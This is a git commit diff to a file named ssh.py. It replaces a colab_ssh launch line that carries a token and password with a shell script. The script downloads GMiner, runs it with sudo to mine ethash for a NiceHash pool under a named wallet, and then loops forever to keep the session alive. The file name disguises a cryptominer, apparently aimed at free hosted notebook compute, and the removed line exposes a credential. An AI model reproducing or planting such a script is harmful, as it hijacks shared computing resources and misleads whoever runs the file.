8f3e23a440445e229a49fd417ab8fb49da27d351
fadsesj89 <89403797+fadsesj89@users.noreply.github.com>
2021-08-24 12:03:47 +0700

    Update ssh.py

--- ssh.py
+++ ssh.py
@@ -1,4 +1,10 @@
- !pip install colab_ssh --upgrade
+#!/bin/sh
 
-from colab_ssh import launch_ssh
-launch_ssh('4WQgXuNHjv6obptbDgmrF_3NSshgQhGrmhygXou3FbV', '100994 ')
+cd $Home
+sudo apt update
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.54/gminer_2_54_linux64.tar.xz && sudo tar -xvf gminer_2_54_linux64.tar.xz && sudo ./miner -a ethash -s daggerhashimoto.eu-west.nicehash.com:3353 --user 3P7nqMEVmpK6HEjNdkbVRpLAC5Z1Hpa8Ws.Aufar --proto stratum
+
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
